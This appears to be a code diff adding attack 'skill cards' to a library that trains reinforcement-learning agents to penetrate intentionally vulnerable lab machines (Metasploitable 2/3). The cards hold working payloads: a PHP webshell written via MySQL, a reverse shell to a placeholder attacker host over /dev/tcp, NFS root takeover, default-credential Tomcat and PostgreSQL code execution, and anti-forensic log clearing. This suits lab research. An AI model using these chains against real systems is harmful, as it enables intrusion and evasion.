@@ -464,11 +464,11 @@ class SkillLibrary:
         return entries[-limit:]
 
     def seed_skills(self) -> int:
-        """Pre-seed the library with 40+ expert skill cards from knowledge packs.
+        """Pre-seed the library with 55+ expert skill cards from knowledge packs.
 
         Each card encodes WHY and WHEN reasoning so PPO agents learn to think,
-        not just execute scripts.  Skills cover MS2, MS3, HTB common patterns,
-        and anti-forensics.
+        not just execute scripts.  Skills cover MS2 (normal+hard), MS3, HTB
+        common patterns, anti-forensics, and strategic reasoning.
 
         Returns:
             int: Number of skills promoted.
@@ -754,6 +754,106 @@ class SkillLibrary:
                 then_action="Remove target from ~/.ssh/known_hosts. WHY: known_hosts entries prove you connected to the target; removing them eliminates SSH forensic evidence on attacker machine.",
                 confidence=0.85,
                 evidence_refs=["ms2_anti_forensics_knowledge"],
+            ),
+            # ─── MS2 HARD MODE: Multi-step chains (no backdoors) ─────
+            SkillCard(
+                id="ms2_hard_mysql_webshell",
+                if_condition="HARD difficulty AND Port 3306 open AND MySQL no-password",
+                then_action="mysql -h {target} -u root → SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/shell.php' → curl http://{target}/shell.php?c=id. WHY: When backdoors are blocked, MySQL's INTO OUTFILE writes a webshell to Apache's docroot. No exploit module needed — just SQL.",
+                confidence=0.91,
+                evidence_refs=["ms2_hard_chain"],
+            ),
+            SkillCard(
+                id="ms2_hard_nfs_chain",
+                if_condition="HARD difficulty AND Port 2049 open (NFS)",
+                then_action="showmount -e {target} → mount -t nfs {target}:/ /mnt → ssh-keygen → write pubkey to /mnt/root/.ssh/authorized_keys → ssh root@{target}. WHY: NFS with no_root_squash lets us write as root remotely. This 4-step chain gives persistent root access without any exploit.",
+                confidence=0.92,
+                evidence_refs=["ms2_kill_chain_nfs_to_root"],
+            ),
+            SkillCard(
+                id="ms2_hard_tomcat_war",
+                if_condition="HARD difficulty AND Port 8180 open AND Tomcat",
+                then_action="msfvenom -p java/jsp_shell_reverse_tcp → curl --upload-file shell.war http://tomcat:tomcat@{target}:8180/manager/deploy → trigger. WHY: Tomcat default creds (tomcat:tomcat) allow WAR deployment. This is a CREDENTIAL-based exploit — not blocked by hard mode.",
+                confidence=0.90,
+                evidence_refs=["ms2_credentials"],
+            ),
+            SkillCard(
+                id="ms2_hard_postgres_rce",
+                if_condition="HARD difficulty AND Port 5432 open AND PostgreSQL",
+                then_action="psql -h {target} -U postgres → CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;. WHY: PostgreSQL COPY FROM PROGRAM executes OS commands. Default creds (postgres:postgres) + SQL RCE = shell without exploit modules.",
+                confidence=0.89,
+                evidence_refs=["ms2_credentials"],
+            ),
+            SkillCard(
+                id="ms2_hard_web_dvwa_chain",
+                if_condition="HARD difficulty AND Port 80 open AND DVWA detected",
+                then_action="dirb http://{target} → login DVWA (admin:password) → SQL injection in vuln pages → extract /etc/passwd via UNION SELECT LOAD_FILE → crack hashes → SSH. WHY: Multi-step web chain using DVWA's intentional vulns. Teaches enumeration→exploitation→post-exploitation arc.",
+                confidence=0.86,
+                evidence_refs=["ms2_services"],
+            ),
+            SkillCard(
+                id="ms2_hard_distcc_privesc",
+                if_condition="HARD difficulty AND Port 3632 open AND distccd",
+                then_action="exploit/unix/misc/distcc_exec → daemon user shell → find / -perm -4000 → nmap --interactive → !sh for root. WHY: distccd gives low-priv shell (daemon). Old nmap with SUID has --interactive mode → shell escape to root. Two-step chain.",
+                confidence=0.85,
+                evidence_refs=["CVE-2004-2687"],
+            ),
+            SkillCard(
+                id="ms2_hard_php_cgi_chain",
+                if_condition="HARD difficulty AND Port 80 open AND PHP-CGI detected",
+                then_action="nikto -h {target} → discover /cgi-bin/ → exploit/multi/http/php_cgi_arg_injection → www-data shell → kernel privesc. WHY: PHP-CGI argument injection (CVE-2012-1823) gives www-data shell. Then enumerate kernel version for privilege escalation.",
+                confidence=0.83,
+                evidence_refs=["CVE-2012-1823"],
+            ),
+            # ─── Advanced Reasoning: Multi-target strategy ────────────
+            SkillCard(
+                id="strategy_difficulty_adaptation",
+                if_condition="Easy paths are blocked (medium/hard difficulty)",
+                then_action="STOP trying backdoors. Enumerate: MySQL(3306), PostgreSQL(5432), NFS(2049), Tomcat(8180), DVWA(80), distccd(3632). These are the MULTI-STEP vectors. WHY: Hard mode specifically blocks single-step root paths. The agent must pivot to credential-based and web-based chains.",
+                confidence=0.94,
+                evidence_refs=["difficulty_presets"],
+            ),
+            SkillCard(
+                id="strategy_parallel_vectors",
+                if_condition="Single exploit path is failing or stuck",
+                then_action="Maintain 3+ parallel attack vectors simultaneously. If MySQL fails, try NFS. If NFS fails, try web. WHY: Real penetration tests never rely on a single vector — redundancy is key.",
+                confidence=0.88,
+                evidence_refs=["ms2_kill_chain_multi_vector"],
+            ),
+            SkillCard(
+                id="strategy_credential_spray",
+                if_condition="Credentials found AND multiple services open",
+                then_action="Test found credentials against ALL open services (SSH, Telnet, MySQL, FTP). WHY: Credential reuse is the #1 post-exploitation technique. Users reuse passwords across services 70%+ of the time.",
+                confidence=0.91,
+                evidence_refs=["lateral_movement_patterns"],
+            ),
+            SkillCard(
+                id="strategy_exploit_ordering",
+                if_condition="Multiple vulnerabilities discovered",
+                then_action="Priority: backdoors(instant) → default creds(fast) → known CVE exploits(reliable) → web vulns(complex) → brute force(slow). WHY: Efficiency matters. The fastest path to root uses the least steps and has the highest probability of success.",
+                confidence=0.93,
+                evidence_refs=["phase_reasoning"],
+            ),
+            SkillCard(
+                id="ms3_mysql_udf_chain",
+                if_condition="MS3 target AND Port 3306 open AND MySQL",
+                then_action="mysql -h {target} -u root -p'sploitme' → CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'; → SELECT sys_exec('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'). WHY: UDF (User-Defined Functions) allow executing system commands from MySQL. MS3's weak password 'sploitme' gives initial access.",
+                confidence=0.87,
+                evidence_refs=["ms3_credentials"],
+            ),
+            SkillCard(
+                id="ms3_wordpress_to_shell_chain",
+                if_condition="MS3 target AND Port 80 open AND WordPress detected",
+                then_action="wpscan --enumerate ap → find vulnerable plugin → exploit OR login admin:admin → Appearance → Theme Editor → inject PHP reverse shell into 404.php. WHY: WordPress admin can edit theme files, injecting PHP code that executes on page load.",
+                confidence=0.86,
+                evidence_refs=["ms3_kill_chain_wordpress"],
+            ),
+            SkillCard(
+                id="strategy_target_switching",
+                if_condition="Current target fully compromised to CLOSEOUT",
+                then_action="Switch targets: if on MS2 → consider MS3. Carry over learned strategies, adjust for new service landscape. WHY: Cross-target transfer learning is the hallmark of a skilled pentester — patterns transfer but details differ.",
+                confidence=0.85,
+                evidence_refs=["multi_target_strategy"],
             ),
         ]
 
